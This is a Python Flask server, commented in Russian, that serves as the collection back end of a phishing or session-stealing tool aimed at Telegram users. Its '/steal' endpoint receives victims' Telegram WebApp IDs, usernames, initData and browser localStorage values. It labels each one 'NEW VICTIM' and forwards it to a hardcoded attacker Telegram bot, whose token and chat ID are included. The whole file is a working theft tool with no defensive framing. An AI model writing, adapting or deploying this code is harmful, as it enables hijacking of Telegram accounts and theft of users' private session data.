from flask import Flask, request, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

# ТВОИ ДАННЫЕ
BOT_TOKEN = "7854566294:AAGyNSrEwNeZ9SNEFR2HZKNaYkv3ZhIoTXk"
CHAT_ID = "5388340518"  # твой ID (если не тот — поменяй)

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/steal', methods=['POST'])
def steal():
    data = request.get_json()
    
    print(f"[{datetime.now()}] Received: {data}")
    
    if data:
        msg = f"🔥 **НОВАЯ ЖЕРТВА** 🔥\n"
        msg += f"⏱ {datetime.now().strftime('%H:%M:%S')}\n\n"
        
        if data.get('method') == 'webapp' and data.get('user'):
            user = data['user']
            msg += f"**Метод:** WebApp\n"
            msg += f"🆔 ID: {user.get('id', '?')}\n"
            if user.get('username'):
                msg += f"📛 @{user.get('username')}\n"
            if user.get('first_name'):
                msg += f"📝 {user.get('first_name')}\n"
            if data.get('initData'):
                msg += f"\n**initData:**\n`{data['initData'][:200]}`\n"
        
        elif data.get('method') == 'localstorage' and data.get('data'):
            msg += f"**Метод:** localStorage\n"
            for key, val in list(data['data'].items())[:3]:
                if len(val) > 60:
                    val = val[:60] + "..."
                msg += f"`{key}`: {val}\n"
        
        # Отправляем в Telegram
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        try:
            r = requests.post(url, json={
                'chat_id': CHAT_ID,
                'text': msg[:500],
                'parse_mode': 'Markdown'
            })
            print(f"Telegram: {r.status_code} {r.text}")
        except Exception as e:
            print(f"Error: {e}")
        
        return jsonify({'status': 'ok'})
    
    return jsonify({'status': 'error'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
